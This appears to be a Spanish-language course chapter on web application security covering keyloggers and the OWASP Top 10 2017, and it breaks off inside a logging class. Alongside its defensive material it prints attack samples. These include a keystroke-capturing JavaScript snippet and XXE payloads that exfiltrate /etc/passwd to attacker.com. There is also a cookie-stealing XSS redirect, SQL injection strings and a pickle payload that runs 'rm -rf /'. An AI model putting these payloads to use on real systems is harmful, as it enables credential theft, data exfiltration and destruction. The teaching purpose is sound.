# Tema 13: Seguridad de Aplicaciones Web

## Índice de Contenidos
1. [Keyloggers](#keyloggers)
2. [OWASP Top Ten 2017](#owasp-top-ten-2017)
3. [OWASP Top Ten 2021](#owasp-top-ten-2021)
4. [Análisis Comparativo 2017 vs 2021](#análisis-comparativo-2017-vs-2021)
5. [Vulnerabilidades Web Específicas](#vulnerabilidades-web-específicas)
6. [Testing de Seguridad Web](#testing-de-seguridad-web)
7. [Secure Development Practices](#secure-development-practices)
8. [Web Application Firewalls (WAF)](#web-application-firewalls-waf)
9. [API Security](#api-security)
10. [Seguridad en Aplicaciones Móviles](#seguridad-en-aplicaciones-móviles)

---

## Keyloggers

### Definición y Conceptos Fundamentales

#### ¿Qué es un Keylogger?
Un **keylogger** es un tipo de software o hardware de vigilancia que registra las pulsaciones de teclas realizadas por un usuario en un dispositivo. Aunque pueden tener usos legítimos como monitoreo parental o auditoría corporativa, frecuentemente son utilizados de manera maliciosa para robar credenciales y información sensible.

```
Keylogger Data Flow:
┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
│   User Input    │───→│   Keylogger     │───→│  Data Storage/  │
│  (Keyboard)     │    │  (Capture)      │    │  Transmission   │
└─────────────────┘    └─────────────────┘    └─────────────────┘
                              │
                              ▼
                       ┌─────────────────┐
                       │ Filtered Data   │
                       │ (Passwords,     │
                       │  Credit Cards,  │
                       │  etc.)          │
                       └─────────────────┘
```

### Tipos de Keyloggers

#### Clasificación por Implementación
```
Tipos de Keyloggers:
├── Hardware Keyloggers
│   ├── USB Keyloggers
│   ├── PS/2 Keyloggers
│   ├── Wireless Keyloggers
│   ├── Keyboard Hardware Mods
│   └── Acoustic Keyloggers
├── Software Keyloggers
│   ├── User-mode Keyloggers
│   ├── Kernel-mode Keyloggers
│   ├── Hypervisor-based Keyloggers
│   ├── Web-based Keyloggers
│   └── Mobile App Keyloggers
├── Firmware Keyloggers
│   ├── BIOS/UEFI based
│   ├── Keyboard firmware mods
│   └── USB device firmware
└── Hybrid Keyloggers
    ├── Hardware + Software combination
    └── Multi-vector approaches
```

#### Hardware Keyloggers

**USB Keyloggers:**
```
USB Keylogger Characteristics:
├── Physical Device Features
│   ├── Small form factor (often USB extension)
│   ├── Internal memory (4MB to 8GB)
│   ├── No software installation required
│   ├── Works with any operating system
│   └── Difficult to detect without physical inspection
├── Installation Methods
│   ├── Insert between keyboard and computer
│   ├── Replace existing USB connector
│   ├── Internal computer modification
│   └── Wireless variants with remote access
├── Data Retrieval
│   ├── Physical device recovery
│   ├── WiFi data transmission
│   ├── Email/FTP automatic upload
│   └── SMS/cellular data transmission
└── Detection Challenges
    ├── No software footprint
    ├── Transparent operation
    ├── No system resource usage
    └── Physical inspection required
```

**Acoustic Keyloggers:**
- Análisis de sonido de pulsaciones de teclas
- Machine learning para identificar teclas específicas
- Micrófonos de alta sensibilidad
- Procesamiento de señales avanzado

#### Software Keyloggers

**Keyloggers a Nivel de Kernel:**
```
Kernel-level Keylogger Architecture:
┌─────────────────────────────────────────────────────────┐
│                 User Space                              │
├─────────────────────────────────────────────────────────┤
│                Kernel Space                             │
│  ┌─────────────┐    ┌─────────────────────────────────┐  │
│  │ Keylogger   │───→│  Keyboard Driver Hook          │  │
│  │ Module      │    │  (Interrupt Handler)           │  │
│  └─────────────┘    └─────────────────────────────────┘  │
├─────────────────────────────────────────────────────────┤
│                 Hardware Layer                          │
│                    Keyboard                             │
└─────────────────────────────────────────────────────────┘

Advantages:
├── Low-level access to keyboard input
├── Difficult to detect by antivirus
├── Operates below user-space applications
├── Can capture system-level passwords
└── Persistent across application restarts

Detection Methods:
├── Rootkit scanners
├── Behavioral analysis
├── System call monitoring
├── Memory dump analysis
└── Boot-time scanning
```

**Web-based Keyloggers:**
```javascript
// Ejemplo básico de keylogger JavaScript (solo educativo)
document.addEventListener('keydown', function(event) {
    // Capturar tecla presionada
    var key = event.key;
    var timestamp = new Date().toISOString();
    
    // Enviar datos a servidor (método malicioso)
    // NOTA: Este código es solo para fines educativos
    sendToServer({
        key: key,
        timestamp: timestamp,
        url: window.location.href
    });
});
```

### Funcionamiento Técnico

#### Métodos de Captura
```
Keyboard Input Capture Methods:
├── API Hooking
│   ├── SetWindowsHookEx (Windows)
│   ├── GetAsyncKeyState polling
│   ├── Raw Input API
│   └── DirectInput interception
├── Driver-level Interception
│   ├── Filter drivers
│   ├── Minifilter drivers
│   ├── Keyboard class driver hooks
│   └── Port driver modifications
├── Injection Techniques
│   ├── DLL injection into processes
│   ├── Code injection into system processes
│   ├── Process hollowing
│   └── Reflective DLL loading
└── Browser-specific Methods
    ├── JavaScript event listeners
    ├── Browser extension keyloggers
    ├── Form grabbing techniques
    └── Clipboard monitoring
```

### Detección y Prevención

#### Técnicas de Detección
```
Keylogger Detection Methods:
├── Static Analysis
│   ├── Signature-based detection
│   ├── File system monitoring
│   ├── Registry analysis
│   ├── Process enumeration
│   └── Network connection analysis
├── Dynamic Analysis
│   ├── Behavioral monitoring
│   ├── API call analysis
│   ├── Memory pattern recognition
│   ├── System call tracing
│   └── Performance impact analysis
├── Heuristic Detection
│   ├── Suspicious process behavior
│   ├── Unusual network activity
│   ├── Keyboard hook detection
│   ├── Screenshot activity monitoring
│   └── Clipboard access patterns
└── Specialized Tools
    ├── Anti-keylogger software
    ├── Rootkit scanners
    ├── System integrity checkers
    └── Hardware inspection tools
```

#### Herramientas Anti-Keylogger
**Software Comercial:**
- **Zemana AntiLogger**: Protección en tiempo real
- **SpyShelter**: Prevención proactiva
- **Malwarebytes Anti-Exploit**: Protección de exploits
- **ESET Smart Security**: Detección integrada

**Herramientas Open Source:**
- **KeyScrambler**: Cifrado de pulsaciones de teclas
- **Neo's SafeKeys**: Teclado virtual seguro
- **Anti-Keylogger Shield**: Detección básica

#### Contramedidas Técnicas
```
Anti-Keylogger Countermeasures:
├── Input Protection
│   ├── Virtual keyboards
│   ├── On-screen keyboards
│   ├── Mouse-click passwords
│   ├── Gesture-based authentication
│   └── Voice recognition systems
├── Encryption Methods
│   ├── Keystroke encryption
│   ├── Secure input channels
│   ├── Hardware security modules
│   └── Trusted platform modules
├── Behavioral Analysis
│   ├── Typing pattern recognition
│   ├── Biometric keystroke analysis
│   ├── Timing attack prevention
│   └── Multi-factor authentication
└── System Hardening
    ├── Kernel protection mechanisms
    ├── Code signing enforcement
    ├── Application sandboxing
    └── Privilege separation
```

### Uso Legítimo vs Malicioso

#### Usos Legítimos
**Aplicaciones Empresariales:**
- Monitoreo de empleados (con consentimiento)
- Auditoría de cumplimiento regulatorio
- Investigaciones forenses autorizadas
- Control parental en dispositivos familiares
- Debugging y desarrollo de software

**Consideraciones Legales:**
```
Legal Keylogger Usage Requirements:
├── Explicit User Consent
│   ├── Clear notification of monitoring
│   ├── Opt-in agreement required
│   ├── Purpose limitation statements
│   └── Data retention policies
├── Regulatory Compliance
│   ├── Employment law adherence
│   ├── Privacy regulation compliance
│   ├── Industry-specific requirements
│   └── Cross-border data transfer rules
├── Technical Safeguards
│   ├── Secure data storage
│   ├── Access control mechanisms
│   ├── Audit logging
│   └── Data anonymization options
└── Governance Framework
    ├── Clear policies and procedures
    ├── Regular compliance audits
    ├── Staff training programs
    └── Incident response plans
```

---

## OWASP Top Ten 2017

### Introducción al OWASP Top 10 2017
El **OWASP Top 10 2017** representa una actualización significativa de las vulnerabilidades web más críticas, basado en datos de más de 40 socios en el área de seguridad de aplicaciones y una encuesta a más de 500 profesionales del sector.

### A1: Injection

#### Descripción de Vulnerabilidades de Inyección
Las **vulnerabilidades de inyección** ocurren cuando datos no confiables se envían a un intérprete como parte de un comando o consulta. Los datos hostiles del atacante pueden hacer que el intérprete ejecute comandos no deseados o acceda a datos sin autorización.

```
Injection Attack Flow:
User Input ──→ Application ──→ Interpreter ──→ Backend System
    │              │              │               │
    │              │              │               │
Malicious       No Input      Command          Unauthorized
 Payload      Validation     Execution           Access
```

**Tipos Principales de Injection:**
```
Injection Types:
├── SQL Injection
│   ├── Union-based SQLi
│   ├── Boolean-based blind SQLi
│   ├── Time-based blind SQLi
│   ├── Error-based SQLi
│   └── Second-order SQLi
├── NoSQL Injection
│   ├── MongoDB injection
│   ├── CouchDB injection
│   ├── Cassandra injection
│   └── Redis injection
├── LDAP Injection
│   ├── Authentication bypass
│   ├── Information disclosure
│   └── Privilege escalation
├── OS Command Injection
│   ├── Direct command execution
│   ├── Command chaining
│   ├── Pipe and redirection abuse
│   └── Environment variable manipulation
├── XML Injection
│   ├── XPath injection
│   ├── XQuery injection
│   └── XML External Entity (XXE)
└── Code Injection
    ├── Server-side template injection
    ├── Expression language injection
    ├── Dynamic code evaluation
    └── Deserialization attacks
```

#### SQL Injection Detallado
**Ejemplo Vulnerable:**
```php
// Código vulnerable
$user_id = $_GET['id'];
$query = "SELECT * FROM users WHERE id = " . $user_id;
$result = mysql_query($query);

// Attack payload: ?id=1 OR 1=1--
// Resulting query: SELECT * FROM users WHERE id = 1 OR 1=1--
```

**Técnicas de Explotación:**
```sql
-- Union-based SQL Injection
1' UNION SELECT username, password FROM admin_users--

-- Boolean-based blind SQL Injection
1' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a'--

-- Time-based blind SQL Injection
1'; IF (1=1) WAITFOR DELAY '00:00:05'--

-- Error-based SQL Injection
1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

#### Prevención de Injection
```
Injection Prevention Strategies:
├── Input Validation
│   ├── Whitelist validation
│   ├── Input length limits
│   ├── Data type validation
│   ├── Character encoding validation
│   └── Business rule validation
├── Parameterized Queries
│   ├── Prepared statements
│   ├── Stored procedures (properly implemented)
│   ├── Parameter binding
│   └── Query builders with parameterization
├── Output Encoding
│   ├── Context-aware encoding
│   ├── HTML entity encoding
│   ├── URL encoding
│   ├── JavaScript encoding
│   └── CSS encoding
└── Principle of Least Privilege
    ├── Database user permissions
    ├── Application service accounts
    ├── Network segmentation
    └── Error message sanitization
```

### A2: Broken Authentication

#### Vulnerabilidades de Autenticación
Las **vulnerabilidades de autenticación** permiten a los atacantes comprometer contraseñas, claves o tokens de sesión, o explotar otros fallos de implementación para asumir identidades de otros usuarios de forma temporal o permanente.

```
Authentication Vulnerability Categories:
├── Credential Stuffing
│   ├── Automated login attempts
│   ├── Breached credential databases
│   ├── Distributed attack sources
│   └── Rate limiting bypass
├── Weak Password Policies
│   ├── Default credentials allowed
│   ├── Common passwords permitted
│   ├── No complexity requirements
│   └── No password rotation
├── Session Management Flaws
│   ├── Predictable session IDs
│   ├── Session fixation
│   ├── Inadequate session timeout
│   └── Session not invalidated on logout
└── Multi-factor Authentication Bypass
    ├── MFA not required for sensitive functions
    ├── Backup authentication methods weak
    ├── SMS-based MFA vulnerabilities
    └── Recovery process weaknesses
```

### A3: Sensitive Data Exposure

#### Exposición de Datos Sensibles
Muchas aplicaciones web y APIs no protegen adecuadamente los datos sensibles, como información financiera, de salud o PII (Personally Identifiable Information).

```
Data Protection Failures:
├── Data in Transit
│   ├── HTTP instead of HTTPS
│   ├── Weak TLS configuration
│   ├── Mixed content issues
│   ├── Certificate validation bypass
│   └── Insecure protocols (FTP, Telnet)
├── Data at Rest
│   ├── Unencrypted databases
│   ├── Weak encryption algorithms
│   ├── Hardcoded encryption keys
│   ├── Unencrypted backups
│   └── Insecure file permissions
├── Data Processing
│   ├── Plaintext passwords in memory
│   ├── Sensitive data in logs
│   ├── Cache poisoning
│   ├── Debug information exposure
│   └── Error message leakage
└── Compliance Violations
    ├── PCI DSS non-compliance
    ├── GDPR violations
    ├── HIPAA non-compliance
    └── Industry-specific regulations
```

### A4: XML External Entities (XXE)

#### Ataques XXE
Los **ataques XML External Entities** ocurren cuando aplicaciones XML más antiguas o mal configuradas evalúan referencias de entidades externas dentro de documentos XML.

```xml
<!-- XXE Attack Example -->
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>

<!-- Blind XXE with external DTD -->
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>

<!-- Parameter entity XXE -->
<!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?x=%file;'>">
%eval;
%exfiltrate;]>
```

### A5: Broken Access Control

#### Control de Acceso Roto
Las restricciones sobre lo que los usuarios autenticados pueden hacer a menudo no se implementan correctamente, permitiendo a los atacantes acceder a funcionalidad no autorizada o datos de otros usuarios.

```
Access Control Vulnerabilities:
├── Vertical Privilege Escalation
│   ├── Admin function access by regular users
│   ├── Bypass of role-based restrictions
│   ├── Direct object references
│   └── Function-level access control missing
├── Horizontal Privilege Escalation
│   ├── Access to other users' data
│   ├── Account enumeration
│   ├── Insecure direct object references
│   └── Parameter manipulation
├── Context-Dependent Access Control
│   ├── Location-based restrictions bypass
│   ├── Time-based access control failures
│   ├── Device-based restrictions bypass
│   └── Network-based access control flaws
└── Business Logic Bypasses
    ├── Workflow circumvention
    ├── Rate limiting bypass
    ├── Price manipulation
    └── Quantity restrictions bypass

**Ejemplo de Control de Acceso Roto:**
```python
# Código vulnerable - Sin validación de autorización
@app.route('/api/users/<int:user_id>/profile')
def get_user_profile(user_id):
    user = User.query.get(user_id)
    return jsonify(user.to_dict())

# Código seguro - Con validación apropiada
@app.route('/api/users/<int:user_id>/profile')
@require_authentication
def get_user_profile(user_id):
    # Verificar si el usuario actual puede acceder a este perfil
    current_user = get_current_user()
    if current_user.id != user_id and not current_user.is_admin():
        abort(403, "Acceso denegado")
    
    user = User.query.get_or_404(user_id)
    return jsonify(user.to_dict())

# Implementación de RBAC (Role-Based Access Control)
class AccessControl:
    def __init__(self):
        self.permissions = {
            'admin': ['read', 'write', 'delete', 'admin'],
            'moderator': ['read', 'write', 'moderate'],
            'user': ['read', 'write_own'],
            'guest': ['read_public']
        }
    
    def check_permission(self, user_role, required_permission, resource_owner=None, current_user=None):
        user_permissions = self.permissions.get(user_role, [])
        
        # Verificar permisos específicos
        if required_permission in user_permissions:
            return True
        
        # Verificar permisos de propietario
        if required_permission == 'write_own' and resource_owner == current_user:
            return True
        
        return False
```
```

### A6: Security Misconfiguration

#### Configuraciones de Seguridad Incorrectas
Las **configuraciones incorrectas** de seguridad son el problema más común. Esto comúnmente resulta de configuraciones predeterminadas inseguras, configuraciones incompletas o ad hoc, almacenamiento en la nube abierto, headers HTTP mal configurados y mensajes de error verbosos que contienen información sensible.

```
Common Security Misconfigurations:
├── Default Configurations
│   ├── Default passwords unchanged
│   ├── Sample applications left installed
│   ├── Default error pages exposed
│   └── Unnecessary services running
├── Missing Security Headers
│   ├── Content Security Policy missing
│   ├── X-Frame-Options not set
│   ├── X-XSS-Protection disabled
│   ├── Strict-Transport-Security missing
│   └── X-Content-Type-Options not set
├── Information Disclosure
│   ├── Detailed error messages
│   ├── Directory listings enabled
│   ├── Debug information exposed
│   ├── Server version disclosure
│   └── Technology stack fingerprinting
└── Infrastructure Security
    ├── Unpatched systems
    ├── Unnecessary ports open
    ├── Insecure protocols enabled
    └── Weak SSL/TLS configuration
```

**Ejemplos de Headers de Seguridad:**
```html
<!-- Content Security Policy -->
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; 
               script-src 'self' 'unsafe-inline' 'unsafe-eval'; 
               style-src 'self' 'unsafe-inline'; 
               img-src 'self' data: https:; 
               font-src 'self'; 
               connect-src 'self'; 
               frame-ancestors 'none';">

<!-- X-Frame-Options -->
<meta http-equiv="X-Frame-Options" content="DENY">

<!-- X-Content-Type-Options -->
<meta http-equiv="X-Content-Type-Options" content="nosniff">

<!-- Strict-Transport-Security -->
<meta http-equiv="Strict-Transport-Security" 
      content="max-age=31536000; includeSubDomains; preload">

<!-- Referrer Policy -->
<meta name="referrer" content="strict-origin-when-cross-origin">
```

**Configuración Segura de Servidor Web (Apache):**
```apache
# Ocultar información del servidor
ServerTokens Prod
ServerSignature Off

# Headers de seguridad
Header always set X-Frame-Options "DENY"
Header always set X-Content-Type-Options "nosniff"
Header always set X-XSS-Protection "1; mode=block"
Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains"
Header always set Content-Security-Policy "default-src 'self'"

# Deshabilitar métodos HTTP innecesarios
<Location />
    <LimitExcept GET POST>
        Require all denied
    </LimitExcept>
</Location>

# Prevenir acceso a archivos sensibles
<FilesMatch "\.(htaccess|htpasswd|ini|log|sh|inc|bak)$">
    Require all denied
</FilesMatch>

# Deshabilitar listado de directorios
Options -Indexes

# Timeout de sesión
Timeout 60
```

### A7: Cross-Site Scripting (XSS)

#### Tipos de XSS
Los **ataques XSS** ocurren cuando una aplicación incluye datos no confiables en una nueva página web sin validación o escape apropiados, o actualiza una página web existente con datos proporcionados por el usuario usando una API del navegador que puede crear HTML o JavaScript.

```
XSS Attack Types:
├── Reflected XSS
│   ├── Non-persistent
│   ├── Payload in URL parameters
│   ├── Immediate execution
│   ├── Social engineering required
│   └── Server-side reflection
├── Stored XSS
│   ├── Persistent payload
│   ├── Database storage
│   ├── Affects multiple users
│   ├── Higher impact potential
│   └── No user interaction needed
├── DOM-based XSS
│   ├── Client-side vulnerability
│   ├── JavaScript manipulation
│   ├── URL fragment exploitation
│   ├── No server involvement
│   └── Modern application risk
└── Blind XSS
    ├── Out-of-band execution
    ├── Delayed payload execution
    ├── Admin panel exploitation
    └── Log file injection
```

#### XSS Attack Examples
```html
<!-- Reflected XSS Example -->
<!-- URL: http://vulnerable-site.com/search?q=<script>alert('XSS')</script> -->
<div>Search results for: <script>alert('XSS')</script></div>

<!-- Stored XSS in Comments -->
<div class="comment">
    <p>Great article! <script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script></p>
</div>

<!-- DOM-based XSS -->
<script>
function updateContent() {
    var userInput = location.hash.substring(1);
    document.getElementById('content').innerHTML = userInput;
}
// URL: http://vulnerable-site.com/page.html#<script>alert('DOM XSS')</script>
</script>

<!-- Advanced XSS Payloads -->
<!-- Bypass basic filters -->
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<iframe srcdoc="<script>alert('XSS')</script>">

<!-- Event handler XSS -->
<input onfocus=alert('XSS') autofocus>
<select onfocus=alert('XSS') autofocus><option>

<!-- JavaScript protocol -->
<a href="javascript:alert('XSS')">Click me</a>
<form><button formaction="javascript:alert('XSS')">Submit</button></form>
```

#### XSS Prevention Techniques
```javascript
// Input Validation and Sanitization
function sanitizeInput(input) {
    // Whitelist approach
    const allowedPattern = /^[a-zA-Z0-9\s.,!?-]+$/;
    if (!allowedPattern.test(input)) {
        throw new Error('Invalid input detected');
    }
    return input;
}

// Output Encoding
function encodeForHTML(input) {
    return input
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#x27;')
        .replace(/\//g, '&#x2F;');
}

function encodeForJavaScript(input) {
    return input
        .replace(/\\/g, '\\\\')
        .replace(/'/g, "\\'")
        .replace(/"/g, '\\"')
        .replace(/\r/g, '\\r')
        .replace(/\n/g, '\\n')
        .replace(/\t/g, '\\t');
}

// Content Security Policy Implementation
const csp = {
    "default-src": ["'self'"],
    "script-src": ["'self'", "'unsafe-inline'"],
    "style-src": ["'self'", "'unsafe-inline'"],
    "img-src": ["'self'", "data:", "https:"],
    "font-src": ["'self'"],
    "connect-src": ["'self'"],
    "frame-ancestors": ["'none'"],
    "base-uri": ["'self'"],
    "form-action": ["'self'"]
};

### A8: Insecure Deserialization

#### Deserialización Insegura
La **deserialización insegura** conduce frecuentemente a la ejecución remota de código. Incluso si los fallos de deserialización no resultan en ejecución remota de código, pueden ser utilizados para realizar ataques, incluyendo ataques de reproducción, ataques de inyección y ataques de escalamiento de privilegios.

```
Deserialization Attack Categories:
├── Remote Code Execution (RCE)
│   ├── Object injection attacks
│   ├── Gadget chain exploitation
│   ├── Magic method abuse
│   ├── Constructor manipulation
│   └── Reflection-based attacks
├── Data Tampering
│   ├── Object state modification
│   ├── Privilege escalation via objects
│   ├── Authentication bypass
│   ├── Session hijacking
│   └── Access control bypass
├── Denial of Service (DoS)
│   ├── Resource exhaustion attacks
│   ├── Infinite loop creation
│   ├── Memory consumption attacks
│   ├── CPU-intensive operations
│   └── Disk space exhaustion
└── Information Disclosure
    ├── Object state exposure
    ├── Memory dump access
    ├── Configuration data leakage
    └── System information disclosure
```

#### Vulnerable Deserialization Examples
```python
# Python pickle vulnerability
import pickle
import base64

# Malicious payload creation
class MaliciousPayload:
    def __reduce__(self):
        import os
        return (os.system, ('rm -rf /',))

# Serialization of malicious object
malicious_obj = MaliciousPayload()
serialized_data = base64.b64encode(pickle.dumps(malicious_obj))

# Vulnerable deserialization
def load_user_data(serialized_data):
    decoded_data = base64.b64decode(serialized_data)
    return pickle.loads(decoded_data)  # DANGEROUS!

# Secure alternative
import json
def load_user_data_secure(json_data):
    try:
        data = json.loads(json_data)
        # Validate data structure
        if not isinstance(data, dict):
            raise ValueError("Invalid data format")
        
        # Whitelist allowed fields
        allowed_fields = ['name', 'email', 'preferences']
        filtered_data = {k: v for k, v in data.items() if k in allowed_fields}
        return filtered_data
    except (json.JSONDecodeError, ValueError) as e:
        logging.error(f"Deserialization error: {e}")
        return None
```

```java
// Java deserialization vulnerability
import java.io.*;
import java.util.Base64;

// Vulnerable code
public Object deserializeUserData(String serializedData) {
    try {
        byte[] data = Base64.getDecoder().decode(serializedData);
        ByteArrayInputStream bis = new ByteArrayInputStream(data);
        ObjectInputStream ois = new ObjectInputStream(bis);
        return ois.readObject(); // VULNERABLE!
    } catch (Exception e) {
        throw new RuntimeException("Deserialization failed", e);
    }
}

// Secure alternatives
public class SecureDeserializer {
    private final Set<String> allowedClasses = Set.of(
        "com.example.User",
        "com.example.UserPreferences",
        "java.lang.String",
        "java.lang.Integer"
    );
    
    public Object deserializeSecurely(String serializedData) {
        try {
            byte[] data = Base64.getDecoder().decode(serializedData);
            ByteArrayInputStream bis = new ByteArrayInputStream(data);
            
            // Custom ObjectInputStream with class filtering
            ObjectInputStream ois = new ObjectInputStream(bis) {
                @Override
                protected Class<?> resolveClass(ObjectStreamClass desc)
                        throws IOException, ClassNotFoundException {
                    String className = desc.getName();
                    if (!allowedClasses.contains(className)) {
                        throw new InvalidClassException(
                            "Deserialization of " + className + " is not allowed");
                    }
                    return super.resolveClass(desc);
                }
            };
            
            return ois.readObject();
        } catch (Exception e) {
            logger.error("Secure deserialization failed", e);
            return null;
        }
    }
}
```

### A9: Using Components with Known Vulnerabilities

#### Componentes con Vulnerabilidades Conocidas
Los **componentes con vulnerabilidades conocidas** son librerías, frameworks y otros módulos de software que se ejecutan con los mismos privilegios que la aplicación. Si un componente vulnerable es explotado, tal ataque puede facilitar pérdida seria de datos o toma de control del servidor.

```
Component Vulnerability Management:
├── Inventory Management
│   ├── Client-side components (JavaScript libraries)
│   ├── Server-side components (frameworks, libraries)
│   ├── System components (OS, web server)
│   ├── Container images and base layers
│   └── Third-party services and APIs
├── Vulnerability Tracking
│   ├── CVE database monitoring
│   ├── Security advisory subscriptions
│   ├── Vendor security notifications
│   ├── Community vulnerability reports
│   └── Automated vulnerability scanning
├── Risk Assessment
│   ├── CVSS scoring analysis
│   ├── Exploitability assessment
│   ├── Business impact evaluation
│   ├── Attack vector analysis
│   └── Compensating controls analysis
└── Update Management
    ├── Patch management processes
    ├── Emergency update procedures
    ├── Rollback strategies
    ├── Testing procedures
    └── Change management integration
```

#### Software Composition Analysis (SCA)
```yaml
# GitHub Dependabot configuration
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "daily"
    reviewers:
      - "security-team"
    assignees:
      - "lead-developer"
    open-pull-requests-limit: 5
    
  - package-ecosystem: "pip"
    directory: "/"
    schedule:
      interval: "weekly"
    allow:
      - dependency-type: "direct"
      - dependency-type: "indirect"

  - package-ecosystem: "maven"
    directory: "/"
    schedule:
      interval: "weekly"
    ignore:
      - dependency-name: "org.apache.logging.log4j:log4j-core"
        versions: ["< 2.17.0"]
```

```json
// package.json with audit configuration
{
  "scripts": {
    "audit": "npm audit --audit-level high",
    "audit-fix": "npm audit fix",
    "security-scan": "npm audit --json | audit-ci --config audit-ci.json"
  },
  "devDependencies": {
    "audit-ci": "^6.6.1",
    "snyk": "^1.1090.0"
  }
}
```

#### Automated Vulnerability Detection Tools
```python
# Python script for dependency vulnerability checking
import subprocess
import json
import sys
from datetime import datetime

class VulnerabilityScanner:
    def __init__(self):
        self.scan_results = {}
        self.critical_threshold = 9.0
        self.high_threshold = 7.0
    
    def scan_python_dependencies(self):
        """Scan Python dependencies using safety"""
        try:
            result = subprocess.run(['safety', 'check', '--json'], 
                                  capture_output=True, text=True)
            if result.returncode != 0:
                self.scan_results['python'] = json.loads(result.stdout)
            else:
                self.scan_results['python'] = []
        except Exception as e:
            print(f"Python scan failed: {e}")
    
    def scan_node_dependencies(self):
        """Scan Node.js dependencies using npm audit"""
        try:
            result = subprocess.run(['npm', 'audit', '--json'], 
                                  capture_output=True, text=True)
            audit_data = json.loads(result.stdout)
            self.scan_results['nodejs'] = audit_data.get('vulnerabilities', {})
        except Exception as e:
            print(f"Node.js scan failed: {e}")
    
    def generate_report(self):
        """Generate vulnerability report"""
        report = {
            'scan_date': datetime.now().isoformat(),
            'critical_count': 0,
            'high_count': 0,
            'medium_count': 0,
            'low_count': 0,
            'vulnerabilities': []
        }
        
        for ecosystem, vulns in self.scan_results.items():
            for vuln in vulns:
                severity_score = float(vuln.get('cvss_score', 0))
                
                if severity_score >= self.critical_threshold:
                    report['critical_count'] += 1
                    severity = 'CRITICAL'
                elif severity_score >= self.high_threshold:
                    report['high_count'] += 1
                    severity = 'HIGH'
                elif severity_score >= 4.0:
                    report['medium_count'] += 1
                    severity = 'MEDIUM'
                else:
                    report['low_count'] += 1
                    severity = 'LOW'
                
                report['vulnerabilities'].append({
                    'ecosystem': ecosystem,
                    'package': vuln.get('package_name'),
                    'version': vuln.get('analyzed_version'),
                    'cve': vuln.get('cve'),
                    'severity': severity,
                    'score': severity_score,
                    'description': vuln.get('advisory')
                })
        
        return report
    
    def should_fail_build(self, report):
        """Determine if build should fail based on vulnerabilities"""
        return report['critical_count'] > 0 or report['high_count'] > 5
```

### A10: Insufficient Logging & Monitoring

#### Registro y Monitoreo Insuficientes
El **registro y monitoreo insuficientes**, junto con la respuesta a incidentes ausente o inefectiva, permite a los atacantes atacar sistemas adicionales, mantener persistencia, pivotar a más sistemas y alterar, extraer o destruir datos.

```
Logging and Monitoring Framework:
├── Security Event Logging
│   ├── Authentication events
│   ├── Authorization failures
│   ├── Input validation failures
│   ├── Application errors
│   ├── System-level security events
│   ├── File access attempts
│   ├── Network connection logs
│   └── Administrative actions
├── Log Management
│   ├── Centralized logging systems
│   ├── Log retention policies
│   ├── Log integrity protection
│   ├── Structured logging formats
│   ├── Log anonymization procedures
│   ├── Secure log transmission
│   └── Log backup strategies
├── Monitoring and Alerting
│   ├── Real-time threat detection
│   ├── Anomaly detection algorithms
│   ├── Correlation rule engines
│   ├── Automated response systems
│   ├── Escalation procedures
│   ├── Dashboard visualization
│   └── Metric thresholds
└── Incident Response
    ├── Incident classification systems
    ├── Response team procedures
    ├── Evidence preservation
    ├── Forensic analysis capabilities
    ├── Communication protocols
    ├── Lessons learned processes
    └── Legal compliance requirements
```

#### Comprehensive Security Logging Implementation
```python
import logging
import json
import hashlib
import time
from datetime import datetime
from typing import Dict, Any, Optional

class SecurityLogger:
    def __init__(self, log_level=logging.INFO):
        # Configure structured logging
        self.logger = logging.getLogger('security_audit')
        self.logger.setLevel(log_level)
        
        # Create formatter for structured logging
        formatter = logging.Formatter(
            '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
        )
        
        # File handler for security events
        file_handler = logging.FileHandler('/var/log/security/app_security.log')
        file_handler.setFormatter(formatter)
        self.logger.addHandler(file_handler)
        
        # Syslog handler for centralized logging
        syslog_handler = logging.handlers.SysLogHandler(address=('localhost', 514))
        syslog_handler.setFormatter(formatter)
        self.logger.addHandler(syslog_handler)
    
    def log_security_event(self, event_type: str, details: Dict[str, Any], 
                          severity: str = 'INFO', user_id: Optional[str] = None,
                          session_id: Optional[str] = None, ip_address: Optional[str] = None):
        """Log structured security events"""
        
        # Create standardized log entry
        log_entry = {
            'timestamp': datetime.utcnow().isoformat(),
            'event_type': event_type,
            'severity': severity.upper(),
            'details': details,
            'correlation_id': self._generate_correlation_id(),
        }
        
        # Add user context if available
        if user_id:
            log_entry['user_id'] = user_id
        if session_id:
            log_entry['session_id'] = session_id
        if ip_address:
            log_entry['source_ip'] = ip_address
        
        # Sanitize sensitive data
        log_entry = self._sanitize_log_data(log_entry)
        
        # Log based on severity
        log_message = json.dumps(log_entry)
        
        if severity.upper() == 'CRITICAL':
            self.logger.critical(log_message)
            self._send_alert(log_entry)
        elif severity.upper() == 'HIGH':
            self.logger.error(log_message)
        elif severity.upper() == 'MEDIUM':
            self.logger.warning(log_message)
        else:
            self.logger.info(log_message)
    
    def log_authentication_attempt(self, username: str, success: bool, 
                                 ip_address: str, user_agent: str = None):
        """Log authentication attempts"""
        details = {
            'username': username,
            'success': success,
            'user_agent': user_agent,
            'attempt_time': time.time()
        }
        
        severity = 'INFO' if success else 'MEDIUM'
        event_type = 'authentication_success' if success else 'authentication_failure'
        
        self.log_security_event(event_type, details, severity, ip_address=ip_address)
    
    def log_authorization_failure(self, user_id: str, resource: str, 
                                action: str, ip_address: str):
        """Log authorization failures"""
        details = {
            'requested_resource': resource,
